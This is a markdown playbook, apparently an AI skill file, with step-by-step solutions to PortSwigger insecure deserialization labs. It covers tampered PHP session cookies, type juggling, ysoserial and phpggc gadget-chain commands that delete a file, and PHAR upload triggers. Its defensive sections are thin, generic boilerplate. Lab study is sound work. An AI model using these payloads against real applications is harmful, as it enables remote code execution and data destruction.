---
name: "Insecure Deserialization — Complete Deep Dive"
description: "Complete PortSwigger deep-dive with exact payloads for every lab variant including zero-day techniques"
domain: cybersecurity
subdomain: bug-hunting
version: "1.0.0"
category: "bug-hunting/deep-dive-labs"
tags: [portswigger, deep-dive, exploitation, zero-day, lab-solutions]
mitre_attack: ["T1190"]
tools: [burp-suite, curl, sqlmap, ffuf, python, hashcat, ysoserial]
difficulty: "advanced"
---

# Insecure Deserialization — Complete Deep Dive

> **Deep-Dive Lab Playbook** — Every PortSwigger lab variant with exact payloads,
> bypass techniques, and zero-day extensions. 🟢 Apprentice 🟡 Practitioner 🔴 Expert

## When to Use
- BSCP certification prep
- Real-world bug bounty hunting
- Building exploitation chains
- Understanding bypass techniques

## Prerequisites
- Burp Suite Professional
- Burp Collaborator / interactsh
- Browser with proxy configured


## Workflow
### Phase 1: Reconnaissance
- Identify input vectors, parameters, and application behavior.
### Phase 2: Exploitation
- Apply standard lab payloads.
### Phase 3: Zero-Day Escalation
- Fuzz filters, bypass WAFs, and chain with other vulns.

## Lab Playbooks

### Lab 1: Modify serialized objects 🟢 APPRENTICE
```
Cookie: session=O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
# Change b:0 to b:1 (admin=true):
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30= (base64)
```
---

### Lab 2: Modify data types 🟡 PRACTITIONER
```
# Change password string to integer 0:
s:8:"password";s:6:"secret"  →  s:8:"password";i:0;
# PHP loose comparison: 0 == "any_string" is TRUE
```
---

### Lab 3: Application functionality exploit 🟡 PRACTITIONER
Delete avatar uses file path from serialized object. Change path to `/home/carlos/morale.txt` → app deletes target file.
---

### Lab 4: Arbitrary object injection PHP 🟡 PRACTITIONER
Find class with `__destruct()` or `__wakeup()` magic method. Inject that class with controlled properties.
---

### Lab 5: Java deserialization Apache Commons 🟡 PRACTITIONER
```bash
java -jar ysoserial.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64
```
Replace session cookie with ysoserial payload (base64-encoded).
---

### Lab 6: PHP pre-built gadget chain 🟡 PRACTITIONER
```bash
./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64
```
Sign with leaked SECRET_KEY, inject as serialized cookie.
---

### Lab 7: Ruby documented gadget 🟡 PRACTITIONER
Use documented Ruby deserialization gadget chain from public research.
---

### Lab 8: Custom Java gadget chain 🔴 EXPERT
Analyze source code, find: serializable class → dangerous method call chain → RCE. Build custom chain.
---

### Lab 9: Custom PHP gadget chain 🔴 EXPERT
Walk class autoloading: `__wakeup()` → `__toString()` → file_get_contents() → arbitrary file read.
---

### Lab 10: PHAR deserialization 🔴 EXPERT
```
# Upload PHAR file disguised as image
# Trigger via: phar:///var/www/uploads/avatar.phar/test
# Any file operation (file_exists, fopen) on phar:// triggers deserialization
```
---


## Blue Team Detection
- Monitor access logs for anomalous payloads.
- Implement strict input validation and parameterized queries where applicable.
- Create WAF rules masking generic attack patterns.

## Zero-Day Research
When standard technique fails:
1. Identify the filter/WAF
2. Fuzz with Burp Intruder custom wordlists
3. Search GitHub/Twitter for new bypasses
4. Chain with other vulns for escalation
5. Try encoding variants: URL, double-URL, unicode, hex


## Key Concepts
| Concept | Description |
|---------|-------------|
| PortSwigger Vectors | Standardized approaches to vulnerability classes. |
| Payload Encoding | Modifying payloads to bypass basic string matching WAFs. |


## Output Format
```
Vulnerability Deep-Dive Report
==============================
Target Vector: [Endpoint]
Bypass Technique: [Explanation of bypass]
Payload Used: [Payload]
Impact Explanation: [Impact]
```

## 🔵 Blue Team
- Deploy robust WAF rules to detect anomalies.
- Monitor logs for unusual access patterns.

## 🛡️ Remediation & Mitigation Strategy
- **Input Validation:** Sanitize and strictly type-check all inputs.
- **Least Privilege:** Constrain component execution bounds.


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- [PortSwigger Labs](https://portswigger.net/web-security/all-labs)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [HackTricks](https://book.hacktricks.xyz/)
